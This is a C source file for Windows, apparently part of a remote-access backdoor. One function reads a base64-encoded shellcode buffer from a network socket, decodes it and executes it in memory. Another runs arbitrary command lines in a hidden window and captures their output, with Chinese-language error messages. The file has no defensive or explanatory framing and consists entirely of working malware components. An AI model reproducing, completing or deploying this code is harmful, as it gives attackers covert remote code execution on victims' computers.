#include <windows.h>
#include <stdio.h>
#include "base64.h"
#include "baseFunction.h"
#define MSG_LEN 10244
void SpawnByShellcode(SOCKET sockClient) {
	char *shellCodeXChar = NULL;
	char *shellCodeXCharB64 = NULL;
	char *shellcodeLenChar;
	int shellcodeLen = 0;
	shellCodeXCharB64 = (char *)malloc(MSG_LEN + 1);
	shellCodeXChar = (char *)malloc(MSG_LEN + 1);
	shellcodeLenChar = (char *)malloc(10);
	recv(sockClient, shellcodeLenChar, 10, 0);
	shellcodeLen = atoi(shellcodeLenChar);
	//printf("shellcodeLen为:%d\n", shellcodeLen);
	recv(sockClient, shellCodeXCharB64, MSG_LEN, 0);
	base64_decode(shellCodeXCharB64, (unsigned char*)shellCodeXChar);
	//CreateThread(NULL,0,ExecuteXCharShellcode, NULL, 0, NULL);
	ExecuteXCharShellcode(shellCodeXChar, shellcodeLen);

	free(shellCodeXChar);
	free(shellCodeXCharB64);
}
int cmd(char *cmdLine, char *message) {
	char tmpChar[MSG_LEN] = { 0 };
	int result;
	DWORD getLength;
	HANDLE hRead, hWrite;
	SECURITY_ATTRIBUTES sa;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
		printf("管道创建失败!");
	}
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	startupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	startupInfo.wShowWindow = SW_HIDE;
	startupInfo.hStdOutput = hWrite;
	startupInfo.hStdError = hWrite;

	result = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &startupInfo, &processInformation);
	if (!result) {

		printf("子进程创建失败!Error:%x:\n", (unsigned int)GetLastError());
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 1;
	}
	CloseHandle(hWrite);
	while (ReadFile(hRead, tmpChar, MSG_LEN, &getLength, 0)) {
		strcat(message, tmpChar);
		ZeroMemory(&tmpChar, MSG_LEN);
	}
	CloseHandle(hRead);
	return 0;
}